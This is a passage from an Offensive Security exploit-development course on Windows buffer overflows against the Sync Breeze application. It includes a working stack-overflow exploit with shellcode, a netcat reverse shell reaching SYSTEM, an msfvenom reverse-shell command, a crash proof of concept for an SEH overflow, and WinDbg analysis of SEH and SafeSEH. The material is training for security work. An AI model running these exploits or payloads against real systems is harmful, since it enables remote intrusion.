  "\x69\xa3\x7b\x6c\x69\xaa\x67\x3b\x3e\xfb\x56\x32\xaa\x11\xc0" 
  "\xec\xc8\xeb\x94\xd7\x48\x30\x65\xd9\x51\xb5\xd1\xfd\x41\x03" 
  "\xd9\xb9\x35\xdb\x8c\x17\xe3\x9d\x66\xd6\x5d\x74\xd4\xb0\x09" 
  "\x01\x16\x03\x4f\x0e\x73\xf5\xaf\xbf\x2a\x40\xd0\x70\xbb\x44" 
  "\xa9\x6c\x5b\xaa\x60\x35\x6b\xe1\x28\x1c\xe4\xac\xb9\x1c\x69" 
  "\x4f\x14\x62\x94\xcc\x9c\x1b\x63\xcc\xd5\x1e\x2f\x4a\x06\x53" 
  "\x20\x3f\x28\xc0\x41\x6a") 
  shellcode+= "D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode)) 
  inputBuffer = filler + eip + offset + nops + shellcode 
  content = b"username=" + inputBuffer + b"&password=A" 
 
  buffer = b"POST /login HTTP/1.1\r\n" 
  buffer += b"Host: " + server + b"\r\n" 
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 
Firefox/52.0\r\n" 
  buffer += b"Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
  buffer += b"Referer: http://10.11.0.22/login\r\n" 
  buffer += b"Connection: close\r\n" 
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
  buffer += b"Content-Length: "+str(len(content))+"\r\n" 
  buffer += b"\r\n" 
  buffer += content 
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buffer) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
86 
  s.close() 
   
  print("Done!") 
   
except socket.error: 
  print("Could not connect!") 
Listing 82 - stack_overflow_0x07.py: Final exploit code 
To prepare for the reverse shell payload, let’s configure a Netcat listener on port 443 of our 
attacking machine and execute the exploit script. We should quickly receive a SYSTEM reverse 
shell from our victim machine: 
kali@kali:~$ sudo nc -lvp 443 
[sudo] password for kali:  
listening on [any] 443 ... 
192.168.120.10: inverse host lookup failed: Host name lookup failure 
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.10] 49420 
Microsoft Windows [Version 10.0.10240] 
(c) 2015 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32>whoami 
whoami 
nt authority\system 
 
C:\Windows\system32> 
Listing 83 - Receiving a reverse shell on our Kali box 
Excellent! It works. We have created a fully working exploit for a buffer overflow vulnerability from 
scratch. However, we still have one small inconvenience to overcome - if we exit the reverse shell, 
the Sync Breeze service crashes and exits. This is far from ideal. 
3.4.8.1 Exercises 
1. 
Update your proof of concept to include a working payload and a NOP sled. 
2. 
Follow the execution flow in the debugger by setting a breakpoint on the JMP ESP return 
address. Make sure you run through the decoder instructions and identify the place on the 
stack where the bytes get mangled by the GetPC routine. Why is the NOP sled avoiding the 
crash? 
3. 
Set up a Netcat listener on your Kali machine and obtain a reverse shell from Sync Breeze. 
3.4.9 Improving the Exploit 
Following its execution, the default exit method of a Metasploit shellcode is the ExitProcess API. 
This exit method will shut down the whole web service process when the reverse shell is 
terminated, effectively killing the Sync Breeze service and causing it to crash. 
If the program we are exploiting is a threaded application, as in this case, we can try to avoid 
crashing the service completely by using the ExitThread API to only terminate the affected thread 
of the program. This allows our exploit to work without interrupting the usual operation of the 
Sync Breeze server. We can also repeatedly exploit the server and exit the shell without crashing 
the service. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
87 
To instruct msfvenom to use the ExitThread method during shellcode generation, we’ll use the 
EXITFUNC=thread option as shown in the command below: 
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 
EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" 
Listing 84 - Generating shellcode to use ExitThread 
3.4.9.1 Exercise 
1. 
Update the exploit so that Sync Breeze still runs after exploitation. 
3.4.9.2 Extra Mile 
In the C:\Installers\stack_overflow\extra_mile folder of your Windows VM, there are two vulnerable 
applications, VulnApp1.exe and VulnApp2.exe as well as their associated Python proof of concept 
templates. Using what you learned in this module, write exploits for each of the vulnerable 
applications. 
3.5 Wrapping Up 
In this module, we exploited a known vulnerability in the Sync Breeze application, working through 
the steps from the initial proof of concept to a fully working exploit. This helps us understand the 
process of exploiting a remote buffer overflow from a bug report or vulnerability disclosure. 
This process required several steps. First, we crafted a proof of concept that caused an overflow 
and granted us control of critical CPU registers. Next, we manipulated memory to gain reliable 
remote code execution, and finally, we cleaned up the exploit to avoid crashing the target 
application. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
88 
 
4 Exploiting SEH Overflows 
In a previous module we demonstrated how an attacker can exploit a buffer overflow to overwrite 
a return address on the stack and redirect the execution flow in order to execute malicious 
shellcode. 
While this demonstrated a classic buffer overflow, we could also overwrite and leverage other 
structures or pointers to achieve code execution. We’ll explore one of these alternatives in this 
module. 
In particular, we’ll abuse some Windows exception-handling structures and fully exploit a buffer 
overflow in version 10.4.1884 of the Sync Breeze application85 to obtain remote code execution. 
4.1 Installing the Sync Breeze Application 
Before we begin, let’s install the vulnerable application by launching the installer: 
C:\Installers\seh_overflow\syncbreezeent_setup_v10.4.18.exe 
Listing 85 - Path to the Sync Breeze installer 
After accepting the UAC prompt, we’ll click Next, accept the default options, and click Install. 
When the installation process completes, we’ll check Run Sync Breeze Enterprise 10.4.18, as 
shown in Figure 23: 
 
Figure 23: Finishing the Sync Breeze installation 
 
84 (Exploit-db, 2018), https://www.exploit-db.com/exploits/43936 
85 (Flexense, 2019), http://www.syncbreeze.com/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
89 
 
We will be targeting the Server Control component. Let’s gather some basic information about it 
by clicking Options, as shown in Figure 24: 
 
Figure 24: Accessing Sync Breeze options 
Within the options panel, we’ll select Server and inspect the Server Control Port option, which 
indicates the server is listening on the default port, 9121. 
 
Figure 25: Enabling Sync Breeze Web Server 
Since we’ll crash the application multiple times during the development of our exploit, we need 
the ability to restart it quickly. We can do this by restarting the Sync Breeze Enterprise service 
(syncbrs.exe) from Services.msc. This must be done as administrator. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
90 
4.1.1.1 Exercise 
1. 
Install the Sync Breeze application on your Windows 10 student VM. 
4.2 Crashing Sync Breeze 
For the purpose of this module, we’ll start our exploit development by examining a publicly 
available proof of concept86 for a known vulnerability in the Sync Breeze Server Control service 
listening on port 9121. 
The code shown in Listing 86 triggers the vulnerability by crafting a custom protocol header 
carrying a large buffer. 
Normally, we would need to discover the header format in order to interact with 
this service. For purposes of this demonstration, we’ll skip this step. However, 
we’ll discuss this in more detail in a later module, in which we’ll reverse engineer 
a network protocol to acquire such information. 
#!/usr/bin/python 
import socket 
import sys 
from struct import pack 
 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  inputBuffer = b"\x41" * size 
 
  header =  b"\x75\x19\xba\xab" 
  header += b"\x03\x00\x00\x00" 
  header += b"\x00\x40\x00\x00" 
  header += pack('<I', len(inputBuffer)) 
  header += pack('<I', len(inputBuffer)) 
  header += pack('<I', inputBuffer[-1]) 
 
  buf = header + inputBuffer  
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buf) 
  s.close() 
   
  print("Done!") 
   
 
86 (Exploit-DB - Sync Breeze Enterprise 10.4.18 - Denial of-Service), https://www.exploit-db.com/exploits/44481 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
91 
except socket.error: 
  print("Could not connect!") 
Listing 86 - seh_overflow_0x01.py: Triggering the initial crash 
Since we are targeting a Windows service (syncbrs.exe), we must attach WinDbg to the process 
as an administrator. 
Once our debugger is attached, we’ll continue execution with g, then return to Kali and run our 
script with the IP address of our Windows 10 client as the only argument. 
kali@kali:~$ python3 seh_overflow_0x01.py 192.168.120.10 
Sending evil buffer... 
Done! 
Listing 87 - Running the initial proof of concept 
Next, we’ll examine the debugger output: 
(17f8.1984): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20 
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
Listing 88 - Inspecting the initial crash in WinDbg 
As shown in the listing above, the script crashes the service. WinDbg also indicates that we 
triggered an access violation when dereferencing a pointer from the EAX register, which was 
overwritten by our “A” buffer. 
Good. Our simple proof of concept reliably crashes the vulnerable application. We can proceed 
with our exploit development process. 
4.2.1.1 Exercise 
1. 
Write a simple proof of concept to replicate the crash. 
4.3 Analyzing the Crash in WinDbg 
So far, we’ve crashed the vulnerable process while the debugger was attached. We can now 
analyze the crash to better understand what is happening. 
The crash occurs while the application attempts to call an instruction located at offset 0x24 from 
the 0x41414141 address. Because this address is not mapped in memory, attempting to execute 
the “call dword ptr [eax+24h]” instruction triggers an access violation. 
(17f8.1984): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
92 
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20 
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
Listing 89 - Initial crash in WinDbg 
An in-depth examination of our crash shows that the EIP register is not directly under our control: 
0:008> r 
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20 
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
Listing 90 - Dumping the registers at the time of the crash 
Furthermore, Listing 90 reveals that EAX seems to be the only register overwritten by our data. 
At crash time, various registers store pointers to the stack, which seem to contain chunks of our 
data as shown below: 
0:008> dds esp L30 
0194f9a8  0194fb20 
0194f9ac  0194f9bc 
0194f9b0  00000000 
0194f9b4  0194ff18 
0194f9b8  0194fa1c 
0194f9bc  00000000 
0194f9c0  008666c2 libpal!SCA_NetMessage::Deserialize+0x82 
... 
0194fa1c  41414141 
0194fa20  41414141 
0194fa24  41414141 
0194fa28  41414141 
... 
Listing 91 - Inspecting registers and the stack at the moment of the crash 
Before trying to find a way to control the execution flow by leveraging the “call dword ptr 
[eax+24h]” instruction, let’s inspect the crash more closely. 
At this point, the debugger intercepted a first chance exception,87 which is a notification that an 
unexpected event occurred during the program’s normal execution. If we let the application go (g), 
we obtain the following output: 
0:008> g 
(17f8.1984): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=00000000 ecx=41414141 edx=770a3b20 esi=00000000 edi=00000000 
eip=41414141 esp=0192f438 ebp=0192f458 iopl=0         nv up ei pl zr na pe nc 
 
87 (MSDN, 2005), https://docs.microsoft.com/en-us/archive/blogs/davidklinems/what-is-a-first-chance-exception 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
93 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
Listing 92 - Continuing execution after the access violation 
The output shown in Listing 92 reveals that we have now “magically” gained control over the 
instruction pointer. 
To understand how this happened, we need to introduce a few concepts related to the Structured 
Exception Handlers (SEH) mechanism,88 which is the underlying mechanism used by Windows to 
handle exceptions. 
4.3.1.1 Exercises 
1. 
Inside WinDbg, confirm that the instruction pointer was not overwritten at the time of the 
access violation. 
2. 
After triggering the access violation, resume the execution and confirm control of the 
instruction pointer. 
4.4 Introduction to Structured Exception Handling 
In order to develop a working exploit for our case study, we must understand what happens when 
an exception occurs inside an application. 
As mentioned in the previous section, exceptions are unexpected events that occur during normal 
program execution. There are two kinds of exceptions: hardware exceptions and software 
exceptions. Hardware exceptions are initiated by the CPU. We encountered a typical hardware 
exception when our script crashed the Sync Breeze service as the CPU attempted to dereference 
an invalid memory address. 
On the other hand, software exceptions are explicitly initiated by applications when the execution 
flow reaches unexpected or unwanted conditions. For example, a software developer might want 
to raise an exception in their code to signal that a function could not execute normally because of 
an invalid input argument. 
The most common way to define an exception construct in a programming language is through a 
_try/_except89 code block. A _try/_except block will _try to execute a chuck of code. If an error or 
exception occurs in the execution, it will jump to the _except block, which should contain code 
designed to deal with the exception. 
Most programming languages implement _try/_except functionality, although the 
keywords may vary between languages. 
 
88 (Structured Exception Handling), https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657(v=vs.85).aspx 
89 (SEH code blocks), https://msdn.microsoft.com/en-us/library/windows/desktop/ms679270(v=vs.85).aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
94 
When compiled, the _try/_except code will leverage the Structure Exception Handling(SEH)90 
mechanism implemented by the Windows operating system to handle unexpected events. In the 
next section, we’ll describe this mechanism in more detail. 
4.4.1 Understanding SEH 
At a high level, the SEH mechanism91 (which is implemented in the operating system) gives 
developers an opportunity to take action when an unexpected event happens during the 
execution of a thread. More specifically, when a thread faults, the operating system calls a 
designated set of functions (known as exception handlers), which can correct, or provide more 
information about, the unexpected condition. The exception handlers are user-defined and are 
created during the compilation of the previously mentioned _except code blocks. 
As we’ll explain later, the default exception handler is a special case in that it is 
defined by the operating system itself rather than by the application developer. 
The operating system must be able to locate the correct exception handler when an unexpected 
event is encountered. 
To understand how this happens, it’s important to know that structured exception handling works 
on a per-thread level.92 Additionally, each thread in a program can be identified by the Thread 
Environmental Block (TEB)93 structure, which stores important information related to the 
respective thread. 
Every time a try block is encountered during the execution of a function in a thread, a pointer to 
the 
corresponding 
exception 
handler 
is 
saved 
on 
the 
stack 
within 
the 
_EXCEPTION_REGISTRATION_RECORD structure. Since there may be several try blocks executed 
in a function, these structures are connected together in a linked list.94 
 
90 (SEH by the OS), https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657(v=vs.85).aspx 
91 Note that the information covered in this module applies strictly to the x86 architecture. The x64 implementation of structured 
exception handling is outside the scope of this course. 
92 (A Crash Course on the Depths of Win32™ Structured Exception Handling), 
http://bytepointer.com/resources/pietrek_crash_course_depths_of_win32_seh.htm 
93 (Win32 Thread Information Block), https://en.wikipedia.org/wiki/Win32_Thread_Information_Block 
94 (Wikipedia - Linked List), 
https://en.wikipedia.org/wiki/Linked_list#:~:text=In%20computer%20science%2C%20a%20linked,which%20together%20represent%20
a%20sequence. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
95 
 
Figure 26: Singly-linked _EXCEPTION_REGISTRATION_RECORD list 
When an exception occurs, the operating system inspects the TEB structure of the faulting thread 
and retrieves a pointer (ExceptionList) to the linked list of _EXCEPTION_REGISTRATION_RECORD 
structures through the FS95 CPU register. 
The CPU can access the TEB structure at any given time using the FS segment 
register at offset zero (fs:[0]) on the x86 architecture.96 
After retrieving the ExceptionList, the operating system will begin to walk it and invoke every 
exception handler function until one is able to deal with the unexpected event. If none of the user-
defined functions can handle the exception, the operating system invokes the default exception 
handler, which is always the last node in the linked list. As previously mentioned, this is a special 
 
95 (Wikipedia - Accessing the TEB), https://en.wikipedia.org/wiki/Win32_Thread_Information_Block#Accessing_the_TIB 
96 (NTAPI Undocumented Structures - TEB), 
http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2F
TEB.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
96 
exception handler that terminates the current process or thread in case the application is a 
system service. 
Now that we’ve discussed the SEH mechanism at a high level, let’s analyze this process in more 
detail. Let’s attach our debugger to the syncbrs.exe process and review the structures are used by 
the Structured Exception Handler. 
Fortunately, Microsoft publishes symbols for many structures that the operating 
system uses, including the TEB. This means we can examine key exception 
handling structures inside WinDbg, which will help us better understand the 
process. 
We’ll start by dumping the TEB structure inside WinDbg: 
0:006> dt nt!_TEB 
ntdll!_TEB 
   +0x000 NtTib            : _NT_TIB 
   +0x01c EnvironmentPointer : Ptr32 Void 
   +0x020 ClientId         : _CLIENT_ID 
   +0x028 ActiveRpcHandle  : Ptr32 Void 
   +0x02c ThreadLocalStoragePointer : Ptr32 Void 
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB 
   +0x034 LastErrorValue   : Uint4B 
   +0x038 CountOfOwnedCriticalSections : Uint4B 
   +0x03c CsrClientThread  : Ptr32 Void 
   +0x040 Win32ThreadInfo  : Ptr32 Void 
... 
Listing 93 - Dumping the nt!_TEB structure in WinDbg 
According to Listing 93, the nt!_TEB structure starts with a nested structure called _NT_TIB. 
Dumping _NT_TIB inside WinDbg shows that the first member in this structure is a pointer named 
ExceptionList, which points to the first _EXCEPTION_REGISTRATION_RECORD structure. 
0:006> dt _NT_TIB 
ntdll!_NT_TIB 
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 StackBase        : Ptr32 Void 
   +0x008 StackLimit       : Ptr32 Void 
   +0x00c SubSystemTib     : Ptr32 Void 
   +0x010 FiberData        : Ptr32 Void 
   +0x010 Version          : Uint4B 
   +0x014 ArbitraryUserPointer : Ptr32 Void 
   +0x018 Self             : Ptr32 _NT_TIB 
Listing 94 - Dumping the _NT_TIB structure in WinDbg 
WinDbg reveals that the _EXCEPTION_REGISTRATION_RECORD structure contains two 
members: Next, which points to a _EXCEPTION_REGISTRATION_RECORD structure, and Handler, 
which points to an _EXCEPTION_DISPOSITION structure. 
0:006> dt _EXCEPTION_REGISTRATION_RECORD 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
97 
   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION  
Listing 95 - Dumping the _EXCEPTION_REGISTRATION_RECORD structure in WinDbg 
The Next member acts as a link between _EXCEPTION_REGISTRATION_RECORD structures in 
the singly-linked list of registered exception handlers.97 
The Handler member is a pointer to the exception callback function named _except_handler, 
which returns an _EXCEPTION_DISPOSITION structure on Windows 10 x86. The _except_handler 
function98 prototype is defined in the listing below. 
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (   
    IN PEXCEPTION_RECORD ExceptionRecord,   
    IN VOID EstablisherFrame,   
    IN OUT PCONTEXT ContextRecord,   
    IN OUT PDISPATCHER_CONTEXT DispatcherContext   
);  
Listing 96 - Prototype for the _exception_handler function 
Inside a debugger, the function can have different name variations, such as 
ntdll!_except_handler4. These naming differences are introduced by the symbols 
provided by Microsoft for each version of Windows. However, the prototype and 
parameters of the function are the same. 
The second and third parameters (EstablisherFrame and ContextRecord) are the most relevant to 
us. EstablisherFrame points to the _EXCEPTION_REGISTRATION_RECORD structure, which is 
used to handle the exception. ContextRecord is a pointer to a CONTEXT99 structure. This structure 
contains processor-specific register data at the time the exception was raised. 
Let’s dump the CONTEXT structure in WinDbg: 
0:006> dt ntdll!_CONTEXT 
   +0x000 ContextFlags     : Uint4B 
   +0x004 Dr0              : Uint4B 
   +0x008 Dr1              : Uint4B 
   +0x00c Dr2              : Uint4B 
   +0x010 Dr3              : Uint4B 
   +0x014 Dr6              : Uint4B 
   +0x018 Dr7              : Uint4B 
   +0x01c FloatSave        : _FLOATING_SAVE_AREA 
   +0x08c SegGs            : Uint4B 
   +0x090 SegFs            : Uint4B 
   +0x094 SegEs            : Uint4B 
   +0x098 SegDs            : Uint4B 
 
97 (Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP), 
https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-
sehop/ 
98 (EXCEPTION_DISPOSITION function), https://docs.microsoft.com/en-us/cpp/c-runtime-library/except-handler3?view=msvc-160 
99 (MSDN - CONTEXT structure), https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
98 
   +0x09c Edi              : Uint4B 
   +0x0a0 Esi              : Uint4B 
   +0x0a4 Ebx              : Uint4B 
   +0x0a8 Edx              : Uint4B 
   +0x0ac Ecx              : Uint4B 
   +0x0b0 Eax              : Uint4B 
   +0x0b4 Ebp              : Uint4B 
   +0x0b8 Eip              : Uint4B 
   +0x0bc SegCs            : Uint4B 
   +0x0c0 EFlags           : Uint4B 
   +0x0c4 Esp              : Uint4B 
   +0x0c8 SegSs            : Uint4B 
   +0x0cc ExtendedRegisters : [512] UChar 
Listing 97 - Dumping the CONTEXT structure in WinDbg 
This structure contains many fields and stores the state of all our registers, including the 
instruction pointer (EIP). The information from this structure will be used to restore the execution 
flow after handling the exception. 
As mentioned earlier, the _except_handler function returns an _EXCEPTION_DISPOSITION 
structure. Inspecting this with WinDbg reveals that this structure contains the result of the 
exception handling process. 
0:006> dt _EXCEPTION_DISPOSITION 
ntdll!_EXCEPTION_DISPOSITION 
   ExceptionContinueExecution = 0n0 
   ExceptionContinueSearch = 0n1 
   ExceptionNestedException = 0n2 
   ExceptionCollidedUnwind = 0n3 
Listing 98 - Dumping the _EXCEPTION_DISPOSITION structure in WinDbg 
If the exception handler invoked by the operating system is not valid for dealing with a specific 
exception, it will return ExceptionContinueSearch.100 This result instructs the operating system to 
move on to the next _EXCEPTION_REGISTRATION_RECORD structure in the linked list. On the 
other hand, if the function handler can successfully handle the exception, it will return 
ExceptionContinueExecution, which instructs the system to resume execution. 
The illustration below provides a simplified overview of this mechanism in action: 
 
100 (Safely Searching Process Virtual Address Space), http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
99 
 
Figure 27: SEH Mechanism in action 
4.4.2 SEH Validation 
Now that we understand a bit more about the structures used in the SEH mechanism, let’s 
discuss in detail how the operating system calls the exception handler functions and what checks 
are performed before invoking them. 
When an exception is encountered, ntdll!KiUserExceptionDispatcher101 is called. This function is 
responsible for dispatching exceptions on Windows operating systems. The function takes two 
arguments. The first is an _EXCEPTION_RECORD102 structure that contains information about the 
exception. The second argument is a CONTEXT structure. Eventually, this function calls into 
RtlDispatchException,103 which will retrieve the TEB and proceed to parse the ExceptionList 
through the mechanism explained in the previous section. 
During this process, for each Handler member in the singly-linked ExceptionList list, the operating 
system will ensure that the _EXCEPTION_REGISTRATION_RECORD structure falls within the stack 
memory limits found in the TEB. Furthermore, during the execution of RtlDispatchException, the 
 
101 (A catalog of NTDLL kernel mode to user mode callbacks, part 2: KiUserExceptionDispatcher), http://www.nynaeve.net/?p=201 
102 (MSDN - EXCEPTION_RECORD structure), https://msdn.microsoft.com/en-us/library/windows/desktop/aa363082(v=vs.85).aspx 
103 (RtlDispatchException), http://www.codewarrior.cn/ntdoc/winnt/rtl/mips/RtlDispatchException.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
100 
operating system performs additional checks by invoking the RtlIsValidHandler104 function for 
every exception handler. 
RtlIsValidHandler is responsible for the SafeSEH105 implementation. This is a mitigation 
introduced by Microsoft to prevent an attacker from gaining control of the execution flow after 
overwriting a stack-based exception handler. 
At a high level, if a module is compiled with the SafeSEH flag, the linker will produce an image 
containing a table of safe exception handlers. 
A linker is a computer program that combines object files generated by a 
compiler or assembler into a single executable or library file. It can even combine 
object files into another object file. 
The operating system will then validate the exception_handler on the stack by comparing it to the 
entries in the table of safe exception handlers. If the handler is not found, the system will refuse to 
execute it. 
Unfortunately, the source code for RtlIsValidHandler is not publicly available, so we must instead 
analyze the pseudo-code that was generated by security researchers106 after reverse engineering 
this function on Windows 8.1. 
Pseudo-code is an informal high-level description of a computer program or 
algorithm. While it uses the conventions of a normal programming language, it is 
intended for human readability rather than compilation and execution. 
Although the RtlIsValidHandler pseudo-code listed below was extracted from Windows 8.1, it is 
largely similar to what is executed on the Windows 10 client provided in this course. 
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600 
  { 
        if (/* Handler within the image */) { 
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH) 
                goto InvalidHandler; 
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */) 
                goto InvalidHandler; 
            if (/* Found 'SafeSEH' table */) { 
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its 
cache), or the initialization of the process is not complete */) { 
                    if (/* Handler found in 'SafeSEH' table */) 
                        return TRUE; 
 
104 (Old Meets New: Microsoft Windows SafeSEH Incompatibility), https://www.optiv.com/blog/old-meets-new-microsoft-windows-
safeseh-incompatibility 
105 (MSDN - SAFE_SEH), https://docs.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers 
106 (Dive into exceptions: caution, this may be hard), https://hackmag.com/uncategorized/exceptions-for-hardcore-users/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
101 
                    else 
                        goto InvalidHandler; 
                } 
            return TRUE; 
        } else { 
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled 
in 'ExecuteOptions' of the process */) 
                return TRUE; 
            if (/* Handler is in non-executable area of the memory */) { 
                if (ExecuteDispatchEnable) return TRUE; 
            } 
            else if (ImageDispatchEnable) return TRUE; 
        } 
        InvalidHandler: 
            RtlInvalidHandlerDetected(...); 
            return FALSE; 
  } 
Listing 99 - Pseudo-code for the RtlIsValidHandler function 
As shown in the pseudo-code in Listing 99, the RtlIsValidHandler function checks the 
DllCharacteristics107 of the specific module where the exception occurs. If the module is compiled 
with SafeSEH, the exception_handler will be compared to the entries in the table of safe exception 
handlers before it is executed. 
If RtlIsValidHandler succeeds with its validation steps, the operating system will call the 
RtlpExecuteHandlerForException function. This function is responsible for setting up the 
appropriate arguments and invoking ExecuteHandler. As the name suggests, this native API is 
responsible for calling the _except_handler functions registered on the stack. 
In addition to SafeSEH which requires applications to be compiled with the 
/SAFESEH flag Microsoft introduced an additional mitigation named Structured 
Exception Handler Overwrite Protection (SEHOP).108 
SEHOP works by verifying that the chain of 
_EXCEPTION_REGISTRATION_RECORD structures are valid before invoking 
them. Because the Next member is overwritten as part of a SEH overflow the 
chain of _EXCEPTION_REGISTRATION_RECORD structures is no longer intact 
and the SEHOP mitigation will prevent the corrupted _except_handler from 
executing. 
SEHOP is disabled by default on Windows client editions and enabled by default 
on server editions. 
 
107 (IMAGE_OPTIONAL_HEADER structure), https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx 
108 (Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP), https://msrc-
blog.microsoft.com/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
102 
In summary, whenever an exception occurs, the operating system calls a designated set of 
functions as part of the SEH mechanism. Within these function calls, the ExceptionList single-
linked list is gathered from the TEB structure. Next, the operating system parses the singly-linked 
